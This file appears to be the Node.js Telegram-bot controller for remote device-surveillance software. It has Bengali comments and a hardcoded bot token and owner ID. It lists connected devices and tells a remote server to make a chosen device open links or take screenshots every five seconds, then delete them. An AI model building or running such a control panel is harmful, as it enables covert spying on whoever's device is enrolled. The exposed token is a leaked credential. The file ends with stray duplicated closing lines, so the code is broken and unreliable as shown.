const TelegramBot = require("node-telegram-bot-api");
const axios = require("axios");
const { devices } = require("./devices");

// ===================
// CONFIGURATION
// ===================
const TOKEN = "8221261457:AAFrXAUvBFbdc4TUFB3YlP8pkdl1oAefvP4"; 
const OWNER_ID = 7434833085;       // আপনার Telegram ID
const SERVER_URL = "https://fun-yy3s.onrender.com"; // Render live server

// ===================
// INIT BOT
// ===================
const bot = new TelegramBot(TOKEN, { polling: true });

// ===================
// /start command
// ===================
bot.onText(/\/start/, msg => {
  if (msg.from.id !== OWNER_ID) return;

  const buttons = Object.values(devices)
    .filter(d => d.online)
    .map(d => [{ text: d.name, callback_data: `dev_${d.id}` }]);

  bot.sendMessage(msg.chat.id, "📡 Online Devices", {
    reply_markup: { inline_keyboard: buttons }
  });
});

// ===================
// Callback handler
// ===================
bot.on("callback_query", async query => {
  if (query.from.id !== OWNER_ID) return;

  const chatId = query.message.chat.id;
  const data = query.data;

  // Device click → show options
  if (data.startsWith("dev_")) {
    const id = data.replace("dev_", "");
    bot.sendMessage(chatId, `📱 ${devices[id].name}`, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔗 Open Link", callback_data: `open_${id}` }],
          [{ text: "📸 Start Screenshot", callback_data: `shot_${id}` }],
          [{ text: "⛔ Stop Screenshot", callback_data: `stop_${id}` }],
          [{ text: "⬅ Back", callback_data: "back" }]
        ]
      }
    });
  }

  // Open Link
  if (data.startsWith("open_")) {
    const id = data.replace("open_", "");
    const url = "https://example.com"; // পরবর্তী ধাপে user input দিতে পারবেন
    try {
      await axios.post(`${SERVER_URL}/open-link`, { id, url });
      bot.sendMessage(chatId, "Link sent to device ✅");
    } catch (err) {
      bot.sendMessage(chatId, "Error sending link ❌");
      console.error(err);
    }
  }

  // Start Screenshot
  if (data.startsWith("shot_")) {
    const id = data.replace("shot_", "");
    const interval = 5; // seconds, Bot button থেকে later changeable
    try {
      await axios.post(`${SERVER_URL}/start-shot`, { id, interval });
      bot.sendMessage(chatId, `Screenshot started 📸 (every ${interval}s)`);
    } catch (err) {
      bot.sendMessage(chatId, "Error starting screenshot ❌");
      console.error(err);
    }
  }

  // Stop Screenshot
  if (data.startsWith("stop_")) {
    const id = data.replace("stop_", "");
    try {
      await axios.post(`${SERVER_URL}/stop-shot`, { id });
      bot.sendMessage(chatId, "Screenshot stopped and deleted 🧹");
    } catch (err) {
      bot.sendMessage(chatId, "Error stopping screenshot ❌");
      console.error(err);
    }
  }

  // Back button
  if (data === "back") {
    bot.sendMessage(chatId, "Back to main menu");
  }
});

module.exports = bot;
      }
    });
  }
});

module.exports = bot;
